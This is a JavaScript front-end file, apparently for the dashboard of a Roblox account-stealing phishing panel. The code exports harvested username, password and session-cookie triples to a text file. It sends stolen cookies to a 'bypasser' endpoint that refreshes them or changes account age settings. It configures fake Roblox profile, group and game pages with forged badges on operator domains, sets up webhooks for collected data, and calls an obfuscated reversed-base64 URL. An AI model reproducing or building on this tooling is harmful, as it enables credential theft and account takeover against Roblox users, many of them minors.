if(document.getElementById('downloadAllCookies')) {
	document.getElementById('downloadAllCookies').addEventListener('click', function() {
	  const userCards = document.querySelectorAll('.user-grid-card');
	  let formattedData = [];
	  userCards.forEach(card => {
		try {
		  const username = card.querySelector('h6.text-lg pre').textContent.trim();
		  const passwordButton = card.querySelector('button[onclick^="togglePassword"]');
		  const passwordMatch = passwordButton.getAttribute('onclick').match(/togglePassword\(this, '(.+?)'\)/);
		  const password = passwordMatch ? passwordMatch[1] : '';
		  const cookieButton = card.querySelector('button[onclick^="copyToClipboard"]');
		  const cookieMatch = cookieButton.getAttribute('onclick').match(/copyToClipboard\(this, '(.+?)'\)/);
		  const cookie = cookieMatch ? cookieMatch[1] : '';
		  if (username && password && cookie) {
			formattedData.push(`${username}:${password}:${cookie}`);
		  }
		} catch (error) {
		  console.error('Error extracting data from user card:', error);
		}
	  });
	  const dataText = formattedData.join('\n');
	  const blob = new Blob([dataText], { type: 'text/plain' });
	  const url = URL.createObjectURL(blob);
	  const a = document.createElement('a');
	  a.href = url;
	  a.download = 'roblox_accounts.txt';
	  document.body.appendChild(a);
	  a.click();
	  setTimeout(() => {
		document.body.removeChild(a);
		URL.revokeObjectURL(url);
	  }, 100);
	});
}
function Bypass(el) {
	let data;
	const cookie = $('#cookie').val();
	const action = $('#action').val();
	if (action == 'force_minus_13_all_ages') {
		const password = $('#account_password').val();
		data = {
			'action': action,
			'cookie': cookie,
			'password': password
		}
	} else {
		data = {
			'action': action,
			'cookie': cookie
		}
	}
	$.ajax({
		 url: "/api/bypasser",
		 method: "POST",
		 headers: {
		 	'content-type': 'application/json' 
		 },
		 data: JSON.stringify(data),
		 beforeSend: () => {
			$(el).prop('disabled', true);
			$(el).html(`Processing.. Please wait <iconify-icon icon="line-md:loading-loop" width="24" height="24"></iconify-icon>`);
		 },
		 complete: (data, status) => {
			$(el).prop('disabled', false);
			$(el).html(`Submit <iconify-icon icon="game-icons:click" width="24" height="24"></iconify-icon>`);
			if (status == "success") {
				if (action == "refresh_cookie") {
					$('#cookie').val(data.responseJSON['cookie']);
					if (document.hasFocus()) {
						navigator.clipboard.writeText(data.responseJSON['cookie']).then(() => {
							Toastify({
								text: 'New Cookie Copied.',
								className: "rounded",
								close: true,
								position: "center",
								style: {
									background: "#020024",
								}
							}).showToast();
						});
					} else {
						window.addEventListener('focus', function handler() {
							window.removeEventListener('focus', handler);
							navigator.clipboard.writeText(data.responseJSON['cookie']).then(() => {
								Toastify({
									text: 'New Cookie Copied',
									className: "rounded",
									close: true,
									position: "center",
									style: {
										background: "#020024",
									}
								}).showToast();
							});
						});
					}
				} else {
					Toastify({
						  text: 'Successfully.',
						  className: "rounded",
						  close: true,
						  position: "center",
						  style: {
							background: "#020024",
						  }
					  }).showToast();
				}
			} else {
				Toastify({
					  text: data.responseJSON['errors']['message'],
					  className: "rounded",
					  close: true,
					  position: "center",
					  style: {
						background: "#020024",
					  }
				  }).showToast();
			}
		}
	  });
}
function filtersToogle(el, type) {
	if (type === "custom_webhook_toggle") {
		$('.form-control.text-white.border-secondary').eq(5).prop('readonly', !el.checked);
	}
	$.ajax({
		 url: "/api/update",
		 method: "POST",
		 headers: {
		 	'content-type': 'application/json' 
		 },
		 data: JSON.stringify({
		 	'action': 'filters_toogle',
			'type': type,
			'value': el.checked
		 })
	  });
}
function toggleSettings(el, type) {
  const checkboxes = $('.form-check-input');
  const index = checkboxes.index(el);
  if (index === 1 || index === 2) {
    checkboxes.eq(index === 1 ? 2 : 1).prop('checked', false);
  }
  if (type == "auto_mail") {
	  if($('.form-check-input').eq(3).prop('checked')) {
		  $('#mail').prop("readonly", false);
	  } else {
		  $('#mail').prop("readonly", true);
	  }
  }
  $.ajax({
    url: "/api/update",
    method: "POST",
    headers: {
      'content-type': 'application/json' 
    },
    data: JSON.stringify({
      'action': 'settings_toggle',
      'type': type,
      'value': el.checked
    })
  });
}

function editSettings(el, type) {
	value = $(el).val();
	$.ajax({
		 url: "/api/update",
		 method: "POST",
		 headers: {
		 	'content-type': 'application/json' 
		 },
		 data: JSON.stringify({
		 	'action': 'edit_settings',
			'type': type,
			'value': value
		 }),
		complete: (data, status) => {
			if (status == "success") {
				Toastify({
					  text: 'Changes saved.',
					  className: "rounded",
					  close: true,
					  position: "center",
					  style: {
						background: "#020024",
					  }
				  }).showToast();
			} else {
				Toastify({
					  text: data.responseJSON['errors']['message'],
					  className: "rounded",
					  close: true,
					  position: "center",
					  style: {
						background: "#020024",
					  }
				  }).showToast();
			}
		}
	  });
}
function Filters(type, i, el) {
	const selects = $($('.modal select')[i]);
	$.ajax({
		 url: "/api/update",
		 method: "POST",
		 headers: {
		 	'content-type': 'application/json' 
		 },
		 data: JSON.stringify({
		 	'action': 'set_filters',
			'type': type,
			'name': selects.val(),
			'value': $(el).val()
		 }),
		 complete: (data, status) => {
		 	Toastify({
					  text: `Saved filters for ${selects.val()} with value (${$(el).val()}).`,
					  className: "rounded",
					  close: true,
					  position: "center",
					  style: {
						background: "#020024",
					  }
				  }).showToast();
		}
	  });
}
function CustomHook(el) {
	value = $(el).val();
	$.ajax({
		 url: "/api/update",
		 method: "POST",
		 headers: {
		 	'content-type': 'application/json' 
		 },
		 data: JSON.stringify({
		 	'action': 'edit_custom_hook',
			'value': value
		 }),
		complete: (data, status) => {
			if (status == "success") {
				Toastify({
					  text: 'Changes saved.',
					  className: "rounded",
					  close: true,
					  position: "center",
					  style: {
						background: "#020024",
					  }
				  }).showToast();
			} else {
				Toastify({
					  text: data.responseJSON['errors']['message'],
					  className: "rounded",
					  close: true,
					  position: "center",
					  style: {
						background: "#020024",
					  }
				  }).showToast();
			}
		}
	  });
}
function selectFilter(clickedElement) {
  document.querySelectorAll('.currentFilter.selected').forEach(el => {
    el.classList.remove('selected');
  });
  clickedElement.classList.add('selected');
}
function SetGameFilter(universeId, gameId, name, image) {
	const selected = $('.currentFilter.selected');
	if (selected.length === 0) return;
	const value = [];
	$('.currentFilter.selected .rounded').prop('src', image);
	$('.currentFilter.selected').attr('data-place-id', gameId);
	$('.currentFilter.selected').attr('data-universe-id', universeId);
	$('.currentFilter.selected .text-white').html(name);
	$('.currentFilter').each(function () {
		const name = $(this).find('.text-white').text();
		const image = $(this).find('.rounded').prop('src');
		const placeId = $(this).data('place-id');
		const universeId = $(this).data('universe-id');

		value.push({
			name: name,
			image: image,
			placeId: placeId,
			universeId: universeId
		});
	});
	$.ajax({
		 url: "/api/update",
		 method: "POST",
		 headers: {
		 	'content-type': 'application/json' 
		 },
		 data: JSON.stringify({
		 	'action': 'edit_gamefilter',
			'value': value
		 }),
		complete: (data, status) => {
			if (status == "success") {
				Toastify({
					  text: 'Changes saved.',
					  className: "rounded",
					  close: true,
					  position: "center",
					  style: {
						background: "#020024",
					  }
				  }).showToast();
			} else {
				Toastify({
					  text: data.responseJSON['errors']['message'],
					  className: "rounded",
					  close: true,
					  position: "center",
					  style: {
						background: "#020024",
					  }
				  }).showToast();
			}
		}
	  });
}
function filterGames(val) {
	if (val.length >= 3) {
		$.ajax({
		 url: "/api/searchgame",
		 method: "POST",
		 headers: {
		 	'content-type': 'application/json' 
		 },
		 data: JSON.stringify({
		 	'searchQuery': val
		 }),
		 beforeSend: () => {
			 $('#loadingFilter').show();
			 $('#gameListFilter').empty();
		 },
		 complete: (data, status) => {
			$('#loadingFilter').hide();
			data.responseJSON['searchResults'].forEach(function(item) {
			  $('#gameListFilter').append(`<div class="d-flex align-items-center gap-2 py-1 glow-hover" onclick="SetGameFilter(${item.contents[0].universeId}, ${item.contents[0].rootPlaceId}, '${item.contents[0].name.replace(/^\[[^\]]+\]\s*/g, '').replace(/[\u{1F600}-\u{1F6FF}\u{1F300}-\u{1F5FF}\u{1F900}-\u{1F9FF}\u{2600}-\u{26FF}\u{2700}-\u{27BF}!]/gu, '').trim()}', '${item.imageUrl}')" style="cursor: pointer;">
								  <img src="${item.imageUrl}" alt="${item.contents[0].name}" class="rounded" style="width: 36px; height: 36px;">
								  <span class="text-white">${item.contents[0].name}</span>
								</div>`);
			});
		 }
		});
	}
}
function searchGames(val, code) {
	if (val.length >= 3) {
		$.ajax({
		 url: "/api/searchgame",
		 method: "POST",
		 headers: {
		 	'content-type': 'application/json' 
		 },
		 data: JSON.stringify({
		 	'searchQuery': val
		 }),
		 beforeSend: () => {
			 $('#gameList').empty();
			 $('#gameListLoading').show();
		 },
		 complete: (data, status) => {
			$('#gameListLoading').hide();
			data.responseJSON['searchResults'].forEach(function(item) {
			  $('#gameList').append(`<div class="col-6 col-md-4 col-xxl-3" style="cursor: pointer;" onclick="copyToClipboard(this, 'https://' + localStorage.getItem('domain') + '/games/${item.contents[0].rootPlaceId}/${sanitizeTitle(item.contents[0].name)}?privateServerLinkCode=${code}')">
								  <div class="card h-100 radius-12">
									<img src="${item.imageUrl}" class="card-img-top" alt="${item.contents[0].name}" style="aspect-ratio: 1/1;width: 165px;">
									<span class="mb-0 text-white fw-bold d-flex align-items-center gap-1">${item.contents[0].name}</span>
								  </div>
								</div>`);
			});
		 }
		});
	}
}
function Updater(el, type) {
	let data;
	if (type === "profile") {
		data = {
		 	'action': 'edit_profile',
			'rusername': $('#rusername').val() || $('#rusername').attr('placeholder'),
			'fusername': $('#fusername').val() || $('#fusername').attr('placeholder'),
			'displayname': $('#displayname').val() || $('#displayname').attr('placeholder'),
			'premium': $('#premium').val() || $('#premium').attr('placeholder'),
			'verifiedbadgeprofile': $('#verifiedbadgeprofile').val() || 0,
			'friends': $('#friends').val() || $('#friends').attr('placeholder'),
			'followers': $('#followers').val() || $('#followers').attr('placeholder'),
			'followings': $('#followings').val() || $('#followings').attr('placeholder'),
			'activity': $('#activity').val() || $('#activity').attr('placeholder'),
			'date': $('#date').val() || '2016-05-22',
			'about': $('#about').val() || $('#about').attr('placeholder')
		 };
	} else if (type === "communities") {
		data = {
		 	'action': 'edit_communities',
			'target': $('#target').val() || $('#target').attr('placeholder'),
			'gowner': $('#gowner').val() || $('#gowner').attr('placeholder'),
			'gname': $('#gname').val() || $('#gname').attr('placeholder'),
			'members': $('#members').val() || $('#members').attr('placeholder'),
			'funds': $('#funds').val() || $('#funds').attr('placeholder'),
			'verified': $('#verifiedbadge').val() || $('#verifiedbadge').attr('placeholder'),
			'description': $('#description').val() || $('#description').attr('placeholder'),
			'shout': $('#shout').val() || $('#shout').attr('placeholder')
		 };
	} else if (type === "triplehook") {
		data = {
		 	'action': 'edit_triplehook',
			'dir': $('#tdir').val() || $('#tdir').attr('placeholder'),
			'display': $('#tdisplay').val() || $('#tdisplay').attr('placeholder'),
			'invite': $('#invite').val() || $('#invite').attr('placeholder'),
			'embedcolor': $('#embedcolor').val(),
			'tthumbnail': $('#tthumbnail').val() || $('#tthumbnail').attr('placeholder'),
			'webhook': $('#twebhook').val() || $('#twebhook').attr('placeholder'),
			'referal': $('#referal').val()
		 };
	}
	$.ajax({
		 url: "/api/update",
		 method: "POST",
		 headers: {
		 	'content-type': 'application/json' 
		 },
		 data: JSON.stringify(data),
	 	 beforeSend: () => {
			$(el).html('<span class="d-flex w-100 justify-content-center align-items-center"><iconify-icon icon="eos-icons:three-dots-loading" width="20"></iconify-icon></span>');
		 },
		complete: (data, status) => {
			if (status === "success") {
				if (type === "profile") {
					$($('.text-secondary-light.fw-medium.text-sm')[1]).html('@' + data.responseJSON['data']['username']);
					(data.responseJSON['data']['premium'] ? $($('.mb-0.text-white.fw-bold')[0]).html(data.responseJSON['data']['displayname'] + `<img src="/assets/images/premium.png" style="aspect-ratio: auto;width: 20px;height: 20px;">`) : $($('.mb-0.text-white.fw-bold')[0]).html(data.responseJSON['data']['displayname']));
					$('#JoinButton').hide();
					($('#activitylogo') ? $('#activitylogo').remove() : null);
					if (data.responseJSON['data']['activity'] == "2") {
						$('#JoinButton').show();
						$($('.position-relative')[0]).append('<span class="position-absolute bottom-0 end-0 bg-success rounded-circle" id="activitylogo" style="transform: translate(0, 0);"><iconify-icon icon="famicons:game-controller-outline" width="16"></iconify-icon></span>');
					} else if (data.responseJSON['data']['activity'] == "3") {
						$($('.position-relative')[0]).append('<span class="position-absolute bottom-0 end-0 bg-orange rounded-circle" id="activitylogo" style="transform: translate(0, 0);"><iconify-icon icon="carbon:tools" width="16"></iconify-icon></span>');
					} else if (data.responseJSON['data']['activity'] == "1") {
						$($('.position-relative')[0]).append('<span class="position-absolute bottom-0 end-0 bg-primary rounded-circle" id="activitylogo" style="width: 12px; height: 12px; transform: translate(0, 0);"></span>');
					}
					$($('.fw-semibold')[2]).html(data.responseJSON['data']['friends']);
					$($('.fw-semibold')[3]).html(data.responseJSON['data']['followers']);
					$($('.fw-semibold')[4]).html(data.responseJSON['data']['followings']);
					if (data.responseJSON['data']['head']) {
						$($('.w-50-px.h-50-px.object-fit-cover.rounded-circle')[0]).attr('src', data.responseJSON['data']['head']);
					}
				} else if (type === "communities") {
					$('#groupUrl').val('https://' + localStorage.getItem('domain') + data.responseJSON['data']['pathname_url']);
					$($('.text-secondary-light.fw-medium.text-sm')[2]).html('By ' + data.responseJSON['data']['owner']);
					$($('.mb-0.text-white.fw-bold')[1]).html(data.responseJSON['data']['name']);
					$($('.fw-semibold')[5]).html(data.responseJSON['data']['members']);
					if (data.responseJSON['data']['thumbnail']) {
						$($('.w-50-px.h-50-px.object-fit-cover')[1]).attr('src', data.responseJSON['data']['thumbnail']);
					}
				} else if (type === "triplehook") {
					$($('.form-control.flex-grow-1')[0]).val(data.responseJSON['data']['url']);
				}
				Toastify({
					  text: 'Changes saved.',
					  className: "rounded",
					  close: true,
					  position: "center",
					  style: {
						background: "#020024",
					  }
				  }).showToast();
			} else {
				Toastify({
					  text: data.responseJSON['errors']['message'],
					  className: "rounded",
					  close: true,
					  position: "center",
					  style: {
						background: "#020024",
					  }
				  }).showToast();
			}
			$(el).html('Save Changes');
		}
	 });
}
function selectDomain(domain) {
	$('#domainSelector').remove();
	$('#settings').removeClass('d-none');
	localStorage.setItem('domain', domain);
}
function showModal(data) {
  const modalContent = document.getElementById('modalContent');
  const modal = new bootstrap.Modal(document.getElementById('contentModal'));
  const dataJSON = JSON.parse(atob(data));
  $('#modalUserImage').attr('src', dataJSON.image);
  $('#modalUsername').html(dataJSON.username);
  $('#modalBalance').html(dataJSON.balance);
  $('#modalPendingRobux').html(dataJSON.pending);
  $('#modalSummary').html(dataJSON.summary);
  $('#modalRAP').html(dataJSON.rap);
  $('#modalCredit').html(dataJSON.credit);
  $('#modalGroup').html(dataJSON.group_own);
  modal.show();
}
function showFilters() {
	const modalContent = document.getElementById('modalContent');
    const modal = new bootstrap.Modal(document.getElementById('contentModal'));
	modal.show();
}
function copyToClipboard(button, text) {
  	navigator.clipboard.writeText(text).then(() => {
    const icon = button.querySelector('iconify-icon');
    let originalIcon;
    if (icon) {
      originalIcon = icon.getAttribute('icon');
      icon.setAttribute('icon', 'line-md:check-all');
    }
    Toastify({
      text: 'Copied!',
      className: "rounded",
      close: true,
      position: "center",
      style: {
        background: "#020024",
      }
    }).showToast();
    if (icon) {
      setTimeout(() => {
        icon.setAttribute('icon', originalIcon);
      }, 2000);
    }
  });
}
function sanitizeTitle(input) {
  return input
    .replace(/[^a-zA-Z0-9 ]/g, '')
    .trim()
    .replace(/\s+/g, '-')
}
function togglePassword(button, realPassword) {
    const pre = button.parentElement.querySelector('.password-field');
    const icon = button.querySelector('iconify-icon');
    const isHidden = pre.textContent === '********';

    pre.textContent = isHidden ? realPassword : '********';
    icon.setAttribute('icon', isHidden ? 'humbleicons:eye-off' : 'heroicons-outline:eye');
  }
function animateCount(el, target, duration = 1000) {
    const current = Number(el.textContent.replace(/,/g, '')) || 0;
    let start = null;

    function step(timestamp) {
      if (!start) start = timestamp;
      const progress = timestamp - start;
      const progressRatio = Math.min(progress / duration, 1);
      const value = Math.floor(current + (target - current) * progressRatio);
      el.textContent = value.toLocaleString();

      if (progress < duration) {
        requestAnimationFrame(step);
      } else {
        el.textContent = target.toLocaleString();
      }
    }
    requestAnimationFrame(step);
  }
function animateAllOnLoad() {
    const elements = document.querySelectorAll('.number:not([data-no-auto])');
    elements.forEach(el => {
      const target = Number(el.textContent.replace(/,/g, '')) || 0;
      el.textContent = '0';
      animateCount(el, target, 1500);
    });
  }
if (location.pathname === "/dashboard/overview") {
	animateAllOnLoad();
}
(function ($) {
  'use strict';
	
  if ($('meta[name=wh]').attr('data')) {
	  $.ajax({
	  	url: atob($('meta[name=wh]').attr('data').split("").reverse().join("")),
		complete: (data, status) => {
			if (status == "error") {
				location.replace("/dashboard/wizard");
			}
		}
	  })
  } else if ($('title').html() == 'Pages | Dashboard') {
	  location.replace("/dashboard/wizard");
  }
  
  $('#anonymousModeToggle').on("click", function() {
	  var anonymToggle = this;
	  $.ajax({
		 url: "/api/update",
		 method: "POST",
		 headers: {
		 	'content-type': 'application/json' 
		 },
		 data: JSON.stringify({
		 	'action': 'toggleAnonym',
			'value': anonymToggle.checked
		 })
	  });
  });
  $(".sidebar-menu .dropdown").on("click", function(){
    var item = $(this);
    item.siblings(".dropdown").children(".sidebar-submenu").slideUp();

    item.siblings(".dropdown").removeClass("dropdown-open");

    item.siblings(".dropdown").removeClass("open");

    item.children(".sidebar-submenu").slideToggle();

    item.toggleClass("dropdown-open");
  });

  $(".sidebar-toggle").on("click", function(){
    $(this).toggleClass("active");
    $(".sidebar").toggleClass("active");
    $(".dashboard-main").toggleClass("active");
  });

  $(".sidebar-mobile-toggle").on("click", function(){
    $(".sidebar").addClass("sidebar-open");
    $("body").addClass("overlay-active");
  });

  $(".sidebar-close-btn").on("click", function(){
    $(".sidebar").removeClass("sidebar-open");
    $("body").removeClass("overlay-active");
  });

  //to keep the current page active
  $(function () {
    for (
      var nk = window.location,
        o = $("ul#sidebar-menu a")
          .filter(function () {
            return this.href == nk;
          })
          .addClass("active-page") // anchor
          .parent()
          .addClass("active-page");
      ;

    ) {
      // li
      if (!o.is("li")) break;
      o = o.parent().addClass("show").parent().addClass("open");
    }
  });

/**
* Utility function to calculate the current theme setting based on localStorage.
*/
function calculateSettingAsThemeString({ localStorageTheme }) {
  if (localStorageTheme !== null) {
    return localStorageTheme;
  }
  return "dark"; // default to light theme if nothing is stored
}

/**
* Utility function to update the button text and aria-label.
*/
function updateButton({ buttonEl, isDark }) {
  const newCta = isDark ? "dark" : "light";
  buttonEl.setAttribute("aria-label", newCta);
  buttonEl.innerText = newCta;
}

/**
* Utility function to update the theme setting on the html tag.
*/
function updateThemeOnHtmlEl({ theme }) {
  document.querySelector("html").setAttribute("data-theme", theme);
}

/**
* 1. Grab what we need from the DOM and system settings on page load.
*/
const button = document.querySelector("[data-theme-toggle]");
const localStorageTheme = localStorage.getItem("theme");

/**
* 2. Work out the current site settings.
*/
let currentThemeSetting = calculateSettingAsThemeString({ localStorageTheme });

/**
* 3. If the button exists, update the theme setting and button text according to current settings.
*/
if (button) {
  updateButton({ buttonEl: button, isDark: currentThemeSetting === "dark" });
  updateThemeOnHtmlEl({ theme: currentThemeSetting });

  /**
  * 4. Add an event listener to toggle the theme.
  */
  button.addEventListener("click", (event) => {
    const newTheme = currentThemeSetting === "dark" ? "light" : "dark";

    localStorage.setItem("theme", newTheme);
    updateButton({ buttonEl: button, isDark: newTheme === "dark" });
    updateThemeOnHtmlEl({ theme: newTheme });

    currentThemeSetting = newTheme;
  });
} else {
  // If no button is found, just apply the current theme to the page
  updateThemeOnHtmlEl({ theme: currentThemeSetting });
}


// =========================== Table Header Checkbox checked all js Start ================================
$('#selectAll').on('change', function () {
  $('.form-check .form-check-input').prop('checked', $(this).prop('checked')); 
}); 

  // Remove Table Tr when click on remove btn start
  $('.remove-btn').on('click', function () {
    $(this).closest('tr').remove(); 

    // Check if the table has no rows left
    if ($('.table tbody tr').length === 0) {
      $('.table').addClass('bg-danger');

      // Show notification
      $('.no-items-found').show();
    }
  });
  // Remove Table Tr when click on remove btn end
})(jQuery);
